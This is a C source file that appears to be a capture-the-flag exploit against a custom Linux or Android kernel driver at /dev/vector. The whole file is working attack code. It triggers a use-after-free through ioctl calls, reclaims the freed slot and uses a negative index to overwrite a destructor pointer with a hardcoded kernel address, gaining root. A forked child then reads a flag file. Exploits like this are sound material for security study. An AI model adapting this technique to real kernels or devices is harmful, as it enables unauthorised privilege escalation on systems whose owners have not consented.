#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define ALLOCATE_VECTOR 0x1337001
#define UPDATE_VECTOR   0x1337002
#define DESTROY_VECTOR  0x1337004

typedef struct {
    int64_t idx;
    int64_t fdx;
    union {
        uint64_t* vecp;
        uint64_t  vecv;
    };
} vecarg_t;

#define HOLY_GRAIL 0xffffffc080075a78

int main() {
    int fd = open("/dev/vector", O_RDWR);
    if (fd < 0) return 1;

    // Trigger UAF at fdx 0
    vecarg_t uaf_arg = { .vecp = (uint64_t*)0xffffffc000000000 };
    ioctl(fd, ALLOCATE_VECTOR, &uaf_arg);

    // Reclaim at fdx 1 (reusing the freed slot from fdx 0)
    uint64_t dummy[30] = {0};
    ioctl(fd, ALLOCATE_VECTOR, &(vecarg_t){.vecp = dummy});

    if (fork() == 0) {
        // Child: wait for root and read flag
        while (getuid() != 0) usleep(100);
        system("cat /data/vendor/secret/flag.txt");
        _exit(0);
    }

    // Hijack fdx 1 destructor via aliased fdx 0 (idx -2 = offset 0)
    ioctl(fd, UPDATE_VECTOR, &(vecarg_t){.fdx = 0, .idx = -2, .vecv = HOLY_GRAIL});

    // Trigger root escalation
    ioctl(fd, DESTROY_VECTOR, &(vecarg_t){.fdx = 1});

    return 0;
}
